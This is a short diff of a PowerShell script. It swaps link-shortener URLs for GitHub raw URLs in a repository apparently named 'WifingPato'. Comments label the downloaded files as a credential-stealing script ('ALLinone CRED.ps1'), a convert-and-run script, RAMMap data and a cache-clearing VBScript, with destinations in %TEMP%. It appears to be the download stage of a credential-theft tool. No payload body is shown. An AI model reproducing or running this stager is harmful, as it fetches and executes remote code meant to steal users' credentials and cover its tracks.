@@ -1,9 +1,9 @@
 # Define the URLs of the files to download
 # $url1 = "https://lnkfwd.com/u/LPWEPwX9" # Cred.ps1
-$url1 = "https://lnkfwd.com/u/LSXG3Pk6" #ALLinone CRED.ps1 + treewin.ps1
-$url2 = "https://lnkfwd.com/u/LPWN97hU" # ConvertNrun.ps1
-$url3 = 'https://lnkfwd.com/u/LPWhfWp1' # RAMMap.txt
-$url4 = 'https://lnkfwd.com/u/LPWoFbha' # ClearCache.vbs
+$url1 = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/AllinOneV2.ps1" #ALLinone CRED.ps1 + treewin.ps1
+$url2 = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/ConvertNrun.ps1" # ConvertNrun.ps1
+$url3 = 'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/Rammap.txt' # RAMMap.txt
+$url4 = 'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/ClearCache.vbs' # ClearCache.vbs
 # $url5 = 'https://lnkfwd.com/u/LPWudNLf' # treewin.ps1
 
 # Define the destination paths in the %TEMP% directory
